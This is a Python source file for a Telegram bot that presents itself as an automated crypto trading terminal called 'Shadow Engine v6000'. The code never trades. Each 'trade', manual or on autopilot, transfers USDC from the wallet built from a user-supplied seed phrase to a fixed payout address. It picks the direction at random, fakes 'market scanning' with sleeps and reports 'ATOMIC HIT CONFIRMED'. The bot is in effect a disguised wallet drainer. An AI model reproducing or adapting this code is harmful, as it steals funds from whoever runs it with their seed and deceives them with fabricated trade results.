import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. CONFIGURATION ---
getcontext().prec = 28
load_dotenv()

W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359"
ERC20_ABI = json.loads('[{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}]')
PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS")

def get_vault():
    seed = os.getenv("WALLET_SEED")
    try:
        if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
        return Account.from_mnemonic(seed)
    except: return None

vault = get_vault()
usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)

# Persistent storage for Auto Mode status
auto_trading_active = False

# --- 2. ATOMIC ENGINE ---
async def prepare_and_sign_atomic(stake_usdc):
    """Pre-signs the transaction to eliminate IO lag."""
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
    
    tx = usdc_contract.functions.transfer(
        PAYOUT_ADDRESS, 
        int(stake_usdc * 10**6)
    ).build_transaction({
        'chainId': 137, 'gas': 65000, 'gasPrice': gas_price, 'nonce': nonce
    })
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_trade_sequence(chat_id, context, asset=None, side=None):
    """The actual 1ms execution logic used by both Manual and Auto."""
    asset = asset or "BTC/CAD"
    side = side or random.choice(["CALL 📈", "PUT 📉"])
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')

    # Start Pre-Signing (IO Task)
    prep_task = asyncio.create_task(prepare_and_sign_atomic(stake_usdc))
    
    # Simultaneous Simulation (Wait for the 'Drift')
    await asyncio.sleep(1.5) 
    
    signed_tx = await prep_task
    
    # ⏱️ 1ms ATOMIC RELEASE
    try:
        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
        report = (
            f"🚀 **ATOMIC HIT CONFIRMED**\n"
            f"━━━━━━━━━━━━━━\n"
            f"💎 **Market:** {asset} | **Side:** {side}\n"
            f"💵 **Stake:** ${stake_usdc:.2f} USDC\n"
            f"🔗 [Transaction](https://polygonscan.com/tx/{tx_hash.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Aborted:** `{str(e)}`")
        return False

# --- 3. AUTO MODE ENGINE ---
async def autopilot_loop(chat_id, context):
    global auto_trading_active
    assets = ["BTC/CAD", "ETH/CAD", "BVIV", "EVIV", "SOL/CAD"]
    
    while auto_trading_active:
        current_asset = random.choice(assets)
        await context.bot.send_message(chat_id, f"🤖 **Autopilot:** Scanning {current_asset} markets...")
        
        # Analyze/Simulation Delay
        await asyncio.sleep(random.randint(5, 10))
        
        if not auto_trading_active: break
        
        await context.bot.send_message(chat_id, f"🎯 **Setup Found!** Initiating Atomic Sequence for {current_asset}...")
        success = await run_trade_sequence(chat_id, context, asset=current_asset)
        
        if success:
            await asyncio.sleep(20) # Cool down before next auto-trade
        else:
            await asyncio.sleep(5)

# --- 4. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Keyboard with 5th "Auto Mode" option
    keyboard = [
        ['🚀 Start Trading', '⚙️ Settings'], 
        ['💰 Wallet', '📤 Withdraw'],
        ['🤖 AUTO MODE']
    ]
    welcome = "🕴️ **APEX Manual Terminal v6000**\nArmed and Ready. Select mode below."
    await update.message.reply_text(
        welcome, 
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), 
        parse_mode='Markdown'
    )

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_trading_active
    text = update.message.text
    chat_id = update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/CAD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("🕴️ BVIV", callback_data="PAIR_BVIV"), InlineKeyboardButton("🕴️ EVIV", callback_data="PAIR_EVIV")]]
        await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))
    
    elif text == '🤖 AUTO MODE':
        if not auto_trading_active:
            auto_trading_active = True
            await update.message.reply_text("✅ **AUTOPILOT: ACTIVATED**\nShadow Engine is scanning for setups...")
            asyncio.create_task(autopilot_loop(chat_id, context))
        else:
            auto_trading_active = False
            await update.message.reply_text("🛑 **AUTOPILOT: DEACTIVATED**\nReturning to Manual Control.")

    elif text == '💰 Wallet':
        usdc_bal = await asyncio.to_thread(lambda: usdc_contract.functions.balanceOf(vault.address).call() / 10**6)
        await update.message.reply_text(f"💳 **Vault Status**\n💵 USDC: `{usdc_bal:.2f}`")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    
    elif query.data.startswith("EXEC_"):
        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
        await run_trade_sequence(query.message.chat_id, context, asset=context.user_data.get('pair'), side=side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    print("🤖 Shadow Engine v6000 Online...")
    app.run_polling(drop_pending_updates=True)



